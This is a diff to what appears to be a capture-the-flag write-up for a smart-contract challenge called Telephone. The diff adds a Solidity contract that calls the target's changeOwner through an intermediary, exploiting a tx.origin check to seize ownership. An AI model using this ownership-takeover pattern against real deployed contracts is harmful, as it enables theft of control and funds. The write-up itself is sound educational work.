@@ -35,8 +35,53 @@ That's the current owner of the contract
 
 Since ownership can be transferred if `tx.origin != msg.sender` we can call the `changeOwner` function and pass in our address
 
+Below is the solve contract
 
-Lets check the owner of the contract again
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.19;
+
+import "./telephone.sol";
+
+contract TelephoneHack {
+    Telephone telecontract;
+
+    constructor(address _address) {
+        telecontract = Telephone(_address);
+    }
+
+    function hackContract(address _address) public{ 
+        telecontract.changeOwner(_address);
+    }
+    
+}
+```
+Lets deploy this using forge
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
